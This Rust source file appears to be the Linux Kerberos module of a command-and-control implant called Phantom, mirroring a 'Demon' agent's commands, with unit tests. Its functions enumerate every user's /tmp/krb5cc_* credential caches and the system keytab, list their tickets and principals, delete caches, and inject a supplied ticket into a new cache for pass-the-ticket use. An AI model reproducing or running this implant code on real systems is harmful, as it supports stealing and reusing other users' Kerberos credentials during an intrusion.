//! Linux Kerberos operations for Phantom.
//!
//! Implements the Linux equivalents of the Demon `COMMAND_KERBEROS` subcommands:
//!
//! - **LUID** → returns the current Unix UID (no Windows LUID on Linux).
//! - **KLIST** → parses MIT Kerberos ccache files (`$KRB5CCNAME` or `/tmp/krb5cc_*`).
//! - **PURGE** → destroys ccache files.
//! - **PTT** → writes a raw ticket blob into a new ccache file.
//!
//! Ccache parsing follows the MIT Kerberos **file format version 0x0504** (v4).
//! Keytab parsing follows the MIT Kerberos **keytab format version 0x0502** (v2).

use std::fmt::Write as FmtWrite;
use std::fs;
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};

use crate::error::PhantomError;

// ---------------------------------------------------------------------------
// Ccache file format parsing (version 0x0504)
// ---------------------------------------------------------------------------

/// Magic bytes for ccache file format v4.
const CCACHE_V4_TAG: u16 = 0x0504;

/// A parsed MIT Kerberos credential cache.
#[derive(Debug, Clone)]
pub(crate) struct CCache {
    /// Default client principal.
    pub principal: KerbPrincipal,
    /// Cached credentials (tickets).
    pub credentials: Vec<CcacheCredential>,
    /// Path this ccache was loaded from.
    pub source_path: String,
}

/// A Kerberos principal (name + realm).
#[derive(Debug, Clone)]
pub(crate) struct KerbPrincipal {
    /// Name type from the ccache/keytab record (e.g. KRB5_NT_PRINCIPAL = 1).
    #[expect(dead_code, reason = "parsed for format correctness; used by Debug")]
    pub name_type: u32,
    pub realm: String,
    pub components: Vec<String>,
}

impl std::fmt::Display for KerbPrincipal {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let joined = self.components.join("/");
        write!(f, "{joined}@{}", self.realm)
    }
}

/// A single credential entry inside a ccache.
#[derive(Debug, Clone)]
pub(crate) struct CcacheCredential {
    pub client: KerbPrincipal,
    pub server: KerbPrincipal,
    pub encryption_type: i32,
    pub auth_time: u32,
    pub start_time: u32,
    pub end_time: u32,
    pub renew_till: u32,
    pub ticket_flags: u32,
    /// Raw ticket data.
    pub ticket: Vec<u8>,
    /// Raw second-ticket data (used for user-to-user auth).
    #[expect(dead_code, reason = "parsed for format correctness; used by Debug")]
    pub second_ticket: Vec<u8>,
}

/// Big-endian cursor for parsing ccache binary data.
struct CcacheParser<'a> {
    buf: &'a [u8],
    pos: usize,
}

impl<'a> CcacheParser<'a> {
    fn new(buf: &'a [u8]) -> Self {
        Self { buf, pos: 0 }
    }

    fn remaining(&self) -> usize {
        self.buf.len().saturating_sub(self.pos)
    }

    fn u8(&mut self) -> Result<u8, PhantomError> {
        let b = *self.buf.get(self.pos).ok_or(PhantomError::TaskParse("ccache truncated"))?;
        self.pos += 1;
        Ok(b)
    }

    fn u16(&mut self) -> Result<u16, PhantomError> {
        let s = self
            .buf
            .get(self.pos..self.pos + 2)
            .ok_or(PhantomError::TaskParse("ccache truncated"))?;
        self.pos += 2;
        Ok(u16::from_be_bytes([s[0], s[1]]))
    }

    fn u32(&mut self) -> Result<u32, PhantomError> {
        let s = self
            .buf
            .get(self.pos..self.pos + 4)
            .ok_or(PhantomError::TaskParse("ccache truncated"))?;
        self.pos += 4;
        Ok(u32::from_be_bytes([s[0], s[1], s[2], s[3]]))
    }

    fn i32(&mut self) -> Result<i32, PhantomError> {
        let s = self
            .buf
            .get(self.pos..self.pos + 4)
            .ok_or(PhantomError::TaskParse("ccache truncated"))?;
        self.pos += 4;
        Ok(i32::from_be_bytes([s[0], s[1], s[2], s[3]]))
    }

    fn bytes(&mut self, len: usize) -> Result<&'a [u8], PhantomError> {
        let end =
            self.pos.checked_add(len).ok_or(PhantomError::TaskParse("ccache offset overflow"))?;
        let s = self.buf.get(self.pos..end).ok_or(PhantomError::TaskParse("ccache truncated"))?;
        self.pos = end;
        Ok(s)
    }

    fn skip(&mut self, n: usize) -> Result<(), PhantomError> {
        let end =
            self.pos.checked_add(n).ok_or(PhantomError::TaskParse("ccache offset overflow"))?;
        if end > self.buf.len() {
            return Err(PhantomError::TaskParse("ccache truncated"));
        }
        self.pos = end;
        Ok(())
    }

    /// Read a counted string: `u32 length` followed by `length` bytes of UTF-8.
    fn counted_string(&mut self) -> Result<String, PhantomError> {
        let len = self.u32()? as usize;
        let data = self.bytes(len)?;
        String::from_utf8(data.to_vec())
            .map_err(|_| PhantomError::TaskParse("ccache: invalid UTF-8 in string"))
    }

    /// Read a counted octet string: `u32 length` followed by `length` bytes.
    fn counted_bytes(&mut self) -> Result<Vec<u8>, PhantomError> {
        let len = self.u32()? as usize;
        Ok(self.bytes(len)?.to_vec())
    }

    /// Read a principal.
    fn principal(&mut self) -> Result<KerbPrincipal, PhantomError> {
        let name_type = self.u32()?;
        let num_components = self.u32()? as usize;
        let realm = self.counted_string()?;
        let mut components = Vec::with_capacity(num_components);
        for _ in 0..num_components {
            components.push(self.counted_string()?);
        }
        Ok(KerbPrincipal { name_type, realm, components })
    }

    /// Read a keyblock: `u16 enctype`, `u16 length`, `length` bytes.
    fn keyblock_v4(&mut self) -> Result<(i32, Vec<u8>), PhantomError> {
        let enctype = self.u16()? as i32;
        let len = self.u16()? as usize;
        let data = self.bytes(len)?.to_vec();
        Ok((enctype, data))
    }

    /// Read a credential entry.
    fn credential(&mut self) -> Result<CcacheCredential, PhantomError> {
        let client = self.principal()?;
        let server = self.principal()?;

        let (encryption_type, _key_data) = self.keyblock_v4()?;
        let auth_time = self.u32()?;
        let start_time = self.u32()?;
        let end_time = self.u32()?;
        let renew_till = self.u32()?;

        let _is_skey = self.u8()?;
        let ticket_flags = self.u32()?;

        // Addresses
        let num_addrs = self.u32()? as usize;
        for _ in 0..num_addrs {
            let _addr_type = self.u16()?;
            let addr_len = self.u16()? as usize;
            self.skip(addr_len)?;
        }

        // Auth data
        let num_authdata = self.u32()? as usize;
        for _ in 0..num_authdata {
            let _ad_type = self.u16()?;
            let ad_len = self.u16()? as usize;
            self.skip(ad_len)?;
        }

        let ticket = self.counted_bytes()?;
        let second_ticket = self.counted_bytes()?;

        Ok(CcacheCredential {
            client,
            server,
            encryption_type,
            auth_time,
            start_time,
            end_time,
            renew_till,
            ticket_flags,
            ticket,
            second_ticket,
        })
    }
}

/// Parse a ccache binary blob (file contents).
pub(crate) fn parse_ccache(data: &[u8], source_path: &str) -> Result<CCache, PhantomError> {
    let mut p = CcacheParser::new(data);

    let version = p.u16()?;
    if version != CCACHE_V4_TAG {
        return Err(PhantomError::TaskParse("unsupported ccache version (expected 0x0504)"));
    }

    // v4 header: u16 header_length, then header_length bytes of tag data.
    let header_len = p.u16()? as usize;
    p.skip(header_len)?;

    let principal = p.principal()?;

    let mut credentials = Vec::new();
    while p.remaining() > 0 {
        match p.credential() {
            Ok(cred) => credentials.push(cred),
            // If we hit a parse error at the end of the file, stop — some ccache
            // writers pad with zeroes.
            Err(_) => break,
        }
    }

    Ok(CCache { principal, credentials, source_path: source_path.to_owned() })
}

// ---------------------------------------------------------------------------
// Keytab file format parsing (version 0x0502)
// ---------------------------------------------------------------------------

/// Magic bytes for keytab format v2.
const KEYTAB_V2_TAG: u16 = 0x0502;

/// A parsed keytab file.
#[derive(Debug, Clone)]
pub(crate) struct Keytab {
    pub entries: Vec<KeytabEntry>,
    pub source_path: String,
}

/// A single keytab entry.
#[derive(Debug, Clone)]
pub(crate) struct KeytabEntry {
    pub principal: KerbPrincipal,
    pub timestamp: u32,
    pub kvno: u32,
    pub enctype: u16,
}

/// Parse a keytab binary blob.
pub(crate) fn parse_keytab(data: &[u8], source_path: &str) -> Result<Keytab, PhantomError> {
    let mut p = CcacheParser::new(data);

    let version = p.u16()?;
    if version != KEYTAB_V2_TAG {
        return Err(PhantomError::TaskParse("unsupported keytab version (expected 0x0502)"));
    }

    let mut entries = Vec::new();
    while p.remaining() >= 4 {
        let entry_len = p.i32()?;
        if entry_len <= 0 {
            // Deleted / hole entry — skip the |entry_len| bytes.
            let skip_len = entry_len.unsigned_abs() as usize;
            if skip_len > p.remaining() {
                break;
            }
            p.skip(skip_len)?;
            continue;
        }

        let entry_start = p.pos;
        let entry_end = entry_start + entry_len as usize;
        if entry_end > p.buf.len() {
            break;
        }

        // Parse entry fields (keytab v2 uses big-endian u16 counts).
        let num_components = p.u16()? as usize;
        let realm = p.counted_string()?;
        let mut components = Vec::with_capacity(num_components);
        for _ in 0..num_components {
            components.push(p.counted_string()?);
        }
        let name_type = p.u32()?;
        let timestamp = p.u32()?;

        // kvno is u8 in the base record but a trailing u32 may override it.
        let kvno_u8 = p.u8()? as u32;
        let enctype = p.u16()?;
        let key_len = p.u16()? as usize;
        p.skip(key_len)?;

        // If there are 4+ bytes remaining in this entry, read the u32 kvno.
        let kvno = if p.pos + 4 <= entry_end { p.u32()? } else { kvno_u8 };

        // Skip any remaining bytes in this entry.
        if p.pos < entry_end {
            p.skip(entry_end - p.pos)?;
        }

        entries.push(KeytabEntry {
            principal: KerbPrincipal { name_type, realm, components },
            timestamp,
            kvno,
            enctype,
        });
    }

    Ok(Keytab { entries, source_path: source_path.to_owned() })
}

// ---------------------------------------------------------------------------
// Discovery helpers
// ---------------------------------------------------------------------------

/// Resolve the active ccache path from `$KRB5CCNAME` or the default location.
///
/// `KRB5CCNAME` can be `FILE:/path`, `file:/path`, or just `/path`.
pub(crate) fn resolve_ccache_paths() -> Vec<PathBuf> {
    let mut paths = Vec::new();

    if let Ok(env_val) = std::env::var("KRB5CCNAME") {
        let stripped = env_val
            .strip_prefix("FILE:")
            .or_else(|| env_val.strip_prefix("file:"))
            .unwrap_or(&env_val);
        let p = PathBuf::from(stripped);
        if p.exists() {
            paths.push(p);
        }
        return paths;
    }

    // Default: /tmp/krb5cc_<uid> for the current user, plus any other matches.
    let uid = unsafe { libc::getuid() };
    let default_path = PathBuf::from(format!("/tmp/krb5cc_{uid}"));
    if default_path.exists() {
        paths.push(default_path);
    }

    // Also glob /tmp/krb5cc_* to find caches for other users if running as root.
    if let Ok(entries) = fs::read_dir("/tmp") {
        for entry in entries.flatten() {
            let name = entry.file_name();
            let name_str = name.to_string_lossy();
            if name_str.starts_with("krb5cc_") {
                let p = entry.path();
                if !paths.contains(&p) {
                    paths.push(p);
                }
            }
        }
    }

    paths
}

/// Find the default keytab path.
pub(crate) fn resolve_keytab_paths() -> Vec<PathBuf> {
    let mut paths = Vec::new();

    if let Ok(env_val) = std::env::var("KRB5_KTNAME") {
        let stripped = env_val
            .strip_prefix("FILE:")
            .or_else(|| env_val.strip_prefix("file:"))
            .unwrap_or(&env_val);
        let p = PathBuf::from(stripped);
        if p.exists() {
            paths.push(p);
        }
    }

    let default_kt = Path::new("/etc/krb5.keytab");
    if default_kt.exists() && !paths.contains(&default_kt.to_path_buf()) {
        paths.push(default_kt.to_path_buf());
    }

    paths
}

// ---------------------------------------------------------------------------
// Encryption-type names
// ---------------------------------------------------------------------------

/// Map an encryption type number to a human-readable name.
fn enctype_name(et: i32) -> &'static str {
    match et {
        1 => "DES_CBC_CRC",
        2 => "DES_CBC_MD4",
        3 => "DES_CBC_MD5",
        5 => "DES3_CBC_MD5",
        7 => "DES3_CBC_SHA1",
        16 => "DES3_CBC_SHA1_KD",
        17 => "AES128_CTS_HMAC_SHA1_96",
        18 => "AES256_CTS_HMAC_SHA1_96",
        23 => "RC4_HMAC",
        24 => "RC4_HMAC_EXP",
        _ => "UNKNOWN",
    }
}

/// Decode ticket flags into human-readable labels.
fn ticket_flags_str(flags: u32) -> String {
    // Kerberos ticket flags are in network bit order (bit 0 = MSB).
    let labels = [
        (0x4000_0000, "forwardable"),
        (0x2000_0000, "forwarded"),
        (0x1000_0000, "proxiable"),
        (0x0800_0000, "proxy"),
        (0x0400_0000, "may_postdate"),
        (0x0200_0000, "postdated"),
        (0x0100_0000, "invalid"),
        (0x0080_0000, "renewable"),
        (0x0040_0000, "initial"),
        (0x0020_0000, "pre_authent"),
        (0x0010_0000, "hw_authent"),
        (0x0008_0000, "ok_as_delegate"),
        (0x0001_0000, "name_canonicalize"),
        (0x0000_8000, "anonymous"),
    ];
    let mut parts = Vec::new();
    for (mask, label) in &labels {
        if flags & mask != 0 {
            parts.push(*label);
        }
    }
    if parts.is_empty() {
        format!("(0x{flags:08x})")
    } else {
        let joined = parts.join(" ");
        format!("{joined} (0x{flags:08x})")
    }
}

/// Format a Unix timestamp as an ISO-8601-ish string.
fn format_timestamp(ts: u32) -> String {
    if ts == 0 {
        return "(never)".to_owned();
    }
    match time::OffsetDateTime::from_unix_timestamp(i64::from(ts)) {
        Ok(dt) => {
            // YYYY-MM-DD HH:MM:SS UTC
            let (y, m, d) = (dt.year(), dt.month() as u8, dt.day());
            let (h, min, s) = (dt.hour(), dt.minute(), dt.second());
            format!("{y:04}-{m:02}-{d:02} {h:02}:{min:02}:{s:02} UTC")
        }
        Err(_) => format!("{ts}"),
    }
}

// ---------------------------------------------------------------------------
// Klist formatter
// ---------------------------------------------------------------------------

/// Format all discovered ccache files into a human-readable klist output.
pub(crate) fn format_klist(ccaches: &[CCache]) -> String {
    let mut out = String::new();
    if ccaches.is_empty() {
        out.push_str("No Kerberos credential caches found.\n");
        return out;
    }

    for cc in ccaches {
        let _ = writeln!(out, "Credential cache: {}", cc.source_path);
        let _ = writeln!(out, "Default principal: {}\n", cc.principal);
        if cc.credentials.is_empty() {
            let _ = writeln!(out, "  (no cached tickets)\n");
            continue;
        }
        for (i, cred) in cc.credentials.iter().enumerate() {
            let _ = writeln!(out, "  [{i}] Service: {}", cred.server);
            let _ = writeln!(out, "      Client:  {}", cred.client);
            let _ = writeln!(
                out,
                "      Encryption: {} ({})",
                enctype_name(cred.encryption_type),
                cred.encryption_type
            );
            let _ = writeln!(out, "      Auth time:  {}", format_timestamp(cred.auth_time));
            let _ = writeln!(out, "      Start time: {}", format_timestamp(cred.start_time));
            let _ = writeln!(out, "      End time:   {}", format_timestamp(cred.end_time));
            let _ = writeln!(out, "      Renew till: {}", format_timestamp(cred.renew_till));
            let _ = writeln!(out, "      Flags:      {}", ticket_flags_str(cred.ticket_flags));
            let _ = writeln!(out, "      Ticket len: {} bytes", cred.ticket.len());
            out.push('\n');
        }
    }

    out
}

/// Format all discovered keytab files into a human-readable list.
pub(crate) fn format_keytabs(keytabs: &[Keytab]) -> String {
    let mut out = String::new();
    if keytabs.is_empty() {
        out.push_str("No keytab files found.\n");
        return out;
    }

    for kt in keytabs {
        let _ = writeln!(out, "Keytab: {}", kt.source_path);
        if kt.entries.is_empty() {
            let _ = writeln!(out, "  (no entries)\n");
            continue;
        }
        for (i, entry) in kt.entries.iter().enumerate() {
            let _ = writeln!(out, "  [{i}] Principal: {}", entry.principal);
            let _ = writeln!(
                out,
                "      KVNO: {}  Enctype: {} ({})",
                entry.kvno,
                enctype_name(entry.enctype as i32),
                entry.enctype
            );
            let _ = writeln!(out, "      Timestamp: {}", format_timestamp(entry.timestamp));
            out.push('\n');
        }
    }

    out
}

// ---------------------------------------------------------------------------
// Purge (destroy ccache files)
// ---------------------------------------------------------------------------

/// Delete all discovered ccache files. Returns a human-readable summary.
pub(crate) fn purge_ccache_files() -> String {
    let paths = resolve_ccache_paths();
    if paths.is_empty() {
        return "No Kerberos credential caches found to purge.".to_owned();
    }

    let mut out = String::new();
    for path in &paths {
        match fs::remove_file(path) {
            Ok(()) => {
                let _ = writeln!(out, "Purged: {}", path.display());
            }
            Err(e) => {
                let _ = writeln!(out, "Failed to purge {}: {e}", path.display());
            }
        }
    }
    out
}

// ---------------------------------------------------------------------------
// PTT (pass-the-ticket): write a raw ticket into a ccache file
// ---------------------------------------------------------------------------

/// Build a minimal ccache v4 file containing a single credential entry.
///
/// The `ticket_data` should be the raw ASN.1 DER-encoded Kerberos ticket.
/// `principal_name` is the client principal (e.g. `user@REALM`).
pub(crate) fn build_ccache_blob(
    ticket_data: &[u8],
    principal_name: &str,
) -> Result<Vec<u8>, PhantomError> {
    let (name_part, realm) = principal_name
        .rsplit_once('@')
        .ok_or(PhantomError::TaskParse("PTT: principal must contain '@'"))?;

    let components: Vec<&str> = name_part.split('/').collect();
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map_err(|_| PhantomError::TaskParse("PTT: system clock error"))?
        .as_secs() as u32;
    let end_time = now + 36000; // 10 hours default

    let mut buf = Vec::new();

    // Version header: 0x0504
    buf.extend_from_slice(&CCACHE_V4_TAG.to_be_bytes());
    // Header length: 0 (no tags)
    buf.extend_from_slice(&0u16.to_be_bytes());

    // Default principal
    write_principal(&mut buf, 1, realm, &components);

    // Single credential entry
    // Client principal
    write_principal(&mut buf, 1, realm, &components);
    // Server principal — use krbtgt/REALM@REALM as placeholder
    write_principal(&mut buf, 1, realm, &["krbtgt", realm]);
    // Keyblock: enctype 0, length 0
    buf.extend_from_slice(&0u16.to_be_bytes()); // enctype
    buf.extend_from_slice(&0u16.to_be_bytes()); // key length
    // Times
    buf.extend_from_slice(&now.to_be_bytes()); // auth_time
    buf.extend_from_slice(&now.to_be_bytes()); // start_time
    buf.extend_from_slice(&end_time.to_be_bytes()); // end_time
    buf.extend_from_slice(&end_time.to_be_bytes()); // renew_till
    // is_skey
    buf.push(0);
    // ticket flags (forwardable + renewable + initial + pre_authent)
    buf.extend_from_slice(&0x40a1_0000u32.to_be_bytes());
    // Addresses: 0
    buf.extend_from_slice(&0u32.to_be_bytes());
    // Auth data: 0
    buf.extend_from_slice(&0u32.to_be_bytes());
    // Ticket
    buf.extend_from_slice(&(ticket_data.len() as u32).to_be_bytes());
    buf.extend_from_slice(ticket_data);
    // Second ticket
    buf.extend_from_slice(&0u32.to_be_bytes());

    Ok(buf)
}

/// Write a ccache principal record.
fn write_principal(buf: &mut Vec<u8>, name_type: u32, realm: &str, components: &[&str]) {
    buf.extend_from_slice(&name_type.to_be_bytes());
    buf.extend_from_slice(&(components.len() as u32).to_be_bytes());
    // Realm
    buf.extend_from_slice(&(realm.len() as u32).to_be_bytes());
    buf.extend_from_slice(realm.as_bytes());
    // Components
    for c in components {
        buf.extend_from_slice(&(c.len() as u32).to_be_bytes());
        buf.extend_from_slice(c.as_bytes());
    }
}

/// Write a ticket blob as a ccache file to disk and set `$KRB5CCNAME`.
///
/// Returns a human-readable message describing the result.
pub(crate) fn inject_ticket(ticket_data: &[u8], principal: &str) -> Result<String, PhantomError> {
    let ccache_blob = build_ccache_blob(ticket_data, principal)?;

    let uid = unsafe { libc::getuid() };
    let path = format!("/tmp/krb5cc_{uid}");

    fs::write(&path, &ccache_blob).map_err(|e| PhantomError::Io {
        path: PathBuf::from(&path),
        message: format!("failed to write ccache: {e}"),
    })?;

    // Set the environment variable so subsequent krb5 calls find it.
    // SAFETY: Phantom is single-threaded at the point kerberos commands execute;
    // no other thread is reading environment variables concurrently.
    unsafe { std::env::set_var("KRB5CCNAME", format!("FILE:{path}")) };

    Ok(format!("Ticket injected into {path} ({} bytes, principal: {principal})", ccache_blob.len()))
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    /// Build a minimal ccache v4 binary blob for testing.
    fn make_test_ccache() -> Vec<u8> {
        let mut buf = Vec::new();
        // Version 0x0504
        buf.extend_from_slice(&0x0504u16.to_be_bytes());
        // Header length: 0
        buf.extend_from_slice(&0u16.to_be_bytes());
        // Default principal: name_type=1, 1 component, realm="EXAMPLE.COM", component="testuser"
        buf.extend_from_slice(&1u32.to_be_bytes()); // name_type
        buf.extend_from_slice(&1u32.to_be_bytes()); // num_components
        buf.extend_from_slice(&11u32.to_be_bytes()); // realm length
        buf.extend_from_slice(b"EXAMPLE.COM");
        buf.extend_from_slice(&8u32.to_be_bytes()); // component length
        buf.extend_from_slice(b"testuser");

        // One credential entry
        // Client principal
        buf.extend_from_slice(&1u32.to_be_bytes());
        buf.extend_from_slice(&1u32.to_be_bytes());
        buf.extend_from_slice(&11u32.to_be_bytes());
        buf.extend_from_slice(b"EXAMPLE.COM");
        buf.extend_from_slice(&8u32.to_be_bytes());
        buf.extend_from_slice(b"testuser");
        // Server principal: krbtgt/EXAMPLE.COM@EXAMPLE.COM
        buf.extend_from_slice(&1u32.to_be_bytes());
        buf.extend_from_slice(&2u32.to_be_bytes());
        buf.extend_from_slice(&11u32.to_be_bytes());
        buf.extend_from_slice(b"EXAMPLE.COM");
        buf.extend_from_slice(&6u32.to_be_bytes());
        buf.extend_from_slice(b"krbtgt");
        buf.extend_from_slice(&11u32.to_be_bytes());
        buf.extend_from_slice(b"EXAMPLE.COM");
        // Keyblock: enctype=18 (AES256), key length=0
        buf.extend_from_slice(&18u16.to_be_bytes());
        buf.extend_from_slice(&0u16.to_be_bytes());
        // Times: auth=1000, start=1000, end=37000, renew=73000
        buf.extend_from_slice(&1000u32.to_be_bytes());
        buf.extend_from_slice(&1000u32.to_be_bytes());
        buf.extend_from_slice(&37000u32.to_be_bytes());
        buf.extend_from_slice(&73000u32.to_be_bytes());
        // is_skey=0
        buf.push(0);
        // ticket_flags: forwardable + renewable + initial = 0x40a0_0000
        buf.extend_from_slice(&0x40a0_0000u32.to_be_bytes());
        // Addresses: 0
        buf.extend_from_slice(&0u32.to_be_bytes());
        // Auth data: 0
        buf.extend_from_slice(&0u32.to_be_bytes());
        // Ticket: 4 bytes of dummy data
        buf.extend_from_slice(&4u32.to_be_bytes());
        buf.extend_from_slice(&[0xDE, 0xAD, 0xBE, 0xEF]);
        // Second ticket: 0
        buf.extend_from_slice(&0u32.to_be_bytes());

        buf
    }

    #[test]
    fn parse_ccache_v4_roundtrip() {
        let data = make_test_ccache();
        let cc = parse_ccache(&data, "/tmp/test_ccache").expect("parse failed");

        assert_eq!(cc.principal.realm, "EXAMPLE.COM");
        assert_eq!(cc.principal.components, vec!["testuser"]);
        assert_eq!(cc.source_path, "/tmp/test_ccache");
        assert_eq!(cc.credentials.len(), 1);

        let cred = &cc.credentials[0];
        assert_eq!(cred.client.to_string(), "testuser@EXAMPLE.COM");
        assert_eq!(cred.server.to_string(), "krbtgt/EXAMPLE.COM@EXAMPLE.COM");
        assert_eq!(cred.encryption_type, 18);
        assert_eq!(cred.auth_time, 1000);
        assert_eq!(cred.start_time, 1000);
        assert_eq!(cred.end_time, 37000);
        assert_eq!(cred.renew_till, 73000);
        assert_eq!(cred.ticket, vec![0xDE, 0xAD, 0xBE, 0xEF]);
    }

    #[test]
    fn parse_ccache_rejects_wrong_version() {
        let mut data = make_test_ccache();
        // Change version to 0x0503
        data[0] = 0x05;
        data[1] = 0x03;
        assert!(parse_ccache(&data, "test").is_err());
    }

    #[test]
    fn parse_ccache_empty_credentials() {
        let mut buf = Vec::new();
        buf.extend_from_slice(&0x0504u16.to_be_bytes());
        buf.extend_from_slice(&0u16.to_be_bytes());
        // Principal with 0 components
        buf.extend_from_slice(&1u32.to_be_bytes()); // name_type
        buf.extend_from_slice(&0u32.to_be_bytes()); // 0 components
        buf.extend_from_slice(&4u32.to_be_bytes()); // realm length
        buf.extend_from_slice(b"TEST");

        let cc = parse_ccache(&buf, "empty").expect("parse failed");
        assert_eq!(cc.principal.realm, "TEST");
        assert!(cc.credentials.is_empty());
    }

    /// Build a minimal keytab v2 binary blob for testing.
    fn make_test_keytab() -> Vec<u8> {
        let mut buf = Vec::new();
        // Version 0x0502
        buf.extend_from_slice(&0x0502u16.to_be_bytes());

        // One entry — compute length first, then prepend.
        let mut entry = Vec::new();
        // num_components (u16) = 2
        entry.extend_from_slice(&2u16.to_be_bytes());
        // realm
        entry.extend_from_slice(&11u32.to_be_bytes());
        entry.extend_from_slice(b"EXAMPLE.COM");
        // component 1: "host"
        entry.extend_from_slice(&4u32.to_be_bytes());
        entry.extend_from_slice(b"host");
        // component 2: "server1.example.com"
        entry.extend_from_slice(&19u32.to_be_bytes());
        entry.extend_from_slice(b"server1.example.com");
        // name_type = 1
        entry.extend_from_slice(&1u32.to_be_bytes());
        // timestamp = 1700000000
        entry.extend_from_slice(&1_700_000_000u32.to_be_bytes());
        // kvno (u8) = 3
        entry.push(3);
        // enctype = 18 (AES256)
        entry.extend_from_slice(&18u16.to_be_bytes());
        // key length = 4
        entry.extend_from_slice(&4u16.to_be_bytes());
        // key data
        entry.extend_from_slice(&[0xAA, 0xBB, 0xCC, 0xDD]);
        // trailing u32 kvno = 5 (overrides the u8 kvno)
        entry.extend_from_slice(&5u32.to_be_bytes());

        // Write entry length + entry
        buf.extend_from_slice(&(entry.len() as i32).to_be_bytes());
        buf.extend_from_slice(&entry);

        buf
    }

    #[test]
    fn parse_keytab_v2_roundtrip() {
        let data = make_test_keytab();
        let kt = parse_keytab(&data, "/etc/krb5.keytab").expect("parse failed");

        assert_eq!(kt.entries.len(), 1);
        let e = &kt.entries[0];
        assert_eq!(e.principal.to_string(), "host/server1.example.com@EXAMPLE.COM");
        assert_eq!(e.kvno, 5); // trailing u32 overrides u8
        assert_eq!(e.enctype, 18);
        assert_eq!(e.timestamp, 1_700_000_000);
    }

    #[test]
    fn parse_keytab_rejects_wrong_version() {
        let mut data = make_test_keytab();
        data[1] = 0x01; // 0x0501 instead of 0x0502
        assert!(parse_keytab(&data, "test").is_err());
    }

    #[test]
    fn format_klist_no_caches() {
        let output = format_klist(&[]);
        assert!(output.contains("No Kerberos credential caches found"));
    }

    #[test]
    fn format_klist_with_credentials() {
        let data = make_test_ccache();
        let cc = parse_ccache(&data, "/tmp/krb5cc_1000").expect("parse");
        let output = format_klist(&[cc]);

        assert!(output.contains("Credential cache: /tmp/krb5cc_1000"));
        assert!(output.contains("Default principal: testuser@EXAMPLE.COM"));
        assert!(output.contains("krbtgt/EXAMPLE.COM@EXAMPLE.COM"));
        assert!(output.contains("AES256_CTS_HMAC_SHA1_96"));
    }

    #[test]
    fn format_keytabs_with_entries() {
        let data = make_test_keytab();
        let kt = parse_keytab(&data, "/etc/krb5.keytab").expect("parse");
        let output = format_keytabs(&[kt]);

        assert!(output.contains("Keytab: /etc/krb5.keytab"));
        assert!(output.contains("host/server1.example.com@EXAMPLE.COM"));
        assert!(output.contains("KVNO: 5"));
    }

    #[test]
    fn build_ccache_blob_roundtrip() {
        let ticket = vec![0x30, 0x82, 0x01, 0x00]; // Dummy ASN.1
        let blob = build_ccache_blob(&ticket, "admin@CORP.LOCAL").expect("build");
        let cc = parse_ccache(&blob, "injected").expect("parse roundtrip");

        assert_eq!(cc.principal.realm, "CORP.LOCAL");
        assert_eq!(cc.principal.components, vec!["admin"]);
        assert_eq!(cc.credentials.len(), 1);
        assert_eq!(cc.credentials[0].ticket, ticket);
    }

    #[test]
    fn build_ccache_blob_multi_component_principal() {
        let ticket = vec![0x01];
        let blob = build_ccache_blob(&ticket, "host/web.corp@CORP.LOCAL").expect("build");
        let cc = parse_ccache(&blob, "test").expect("parse");

        assert_eq!(cc.principal.components, vec!["host", "web.corp"]);
        assert_eq!(cc.principal.realm, "CORP.LOCAL");
    }

    #[test]
    fn build_ccache_blob_rejects_no_realm() {
        assert!(build_ccache_blob(&[1], "admin").is_err());
    }

    #[test]
    fn ticket_flags_str_covers_known_flags() {
        let flags = 0x40a0_0000; // forwardable + renewable + pre_authent
        let s = ticket_flags_str(flags);
        assert!(s.contains("forwardable"));
        assert!(s.contains("renewable"));
        assert!(s.contains("pre_authent"));
    }

    #[test]
    fn ticket_flags_str_empty_flags() {
        let s = ticket_flags_str(0);
        assert!(s.contains("0x00000000"));
    }

    #[test]
    fn enctype_name_known() {
        assert_eq!(enctype_name(18), "AES256_CTS_HMAC_SHA1_96");
        assert_eq!(enctype_name(23), "RC4_HMAC");
        assert_eq!(enctype_name(999), "UNKNOWN");
    }

    #[test]
    fn format_timestamp_zero() {
        assert_eq!(format_timestamp(0), "(never)");
    }

    #[test]
    fn format_timestamp_nonzero() {
        let s = format_timestamp(1_700_000_000);
        assert!(s.contains("2023")); // Nov 2023
        assert!(s.contains("UTC"));
    }

    #[test]
    fn parse_keytab_with_deleted_entry() {
        let mut buf = Vec::new();
        buf.extend_from_slice(&0x0502u16.to_be_bytes());

        // Deleted entry (negative length = -8)
        buf.extend_from_slice(&(-8i32).to_be_bytes());
        buf.extend_from_slice(&[0u8; 8]); // 8 bytes of hole

        // Real entry
        let mut entry = Vec::new();
        entry.extend_from_slice(&1u16.to_be_bytes()); // 1 component
        entry.extend_from_slice(&4u32.to_be_bytes());
        entry.extend_from_slice(b"TEST");
        entry.extend_from_slice(&4u32.to_be_bytes());
        entry.extend_from_slice(b"user");
        entry.extend_from_slice(&1u32.to_be_bytes()); // name_type
        entry.extend_from_slice(&0u32.to_be_bytes()); // timestamp
        entry.push(1); // kvno u8
        entry.extend_from_slice(&17u16.to_be_bytes()); // enctype
        entry.extend_from_slice(&0u16.to_be_bytes()); // key length

        buf.extend_from_slice(&(entry.len() as i32).to_be_bytes());
        buf.extend_from_slice(&entry);

        let kt = parse_keytab(&buf, "test").expect("parse");
        assert_eq!(kt.entries.len(), 1);
        assert_eq!(kt.entries[0].principal.to_string(), "user@TEST");
        assert_eq!(kt.entries[0].kvno, 1); // no trailing u32
    }
}
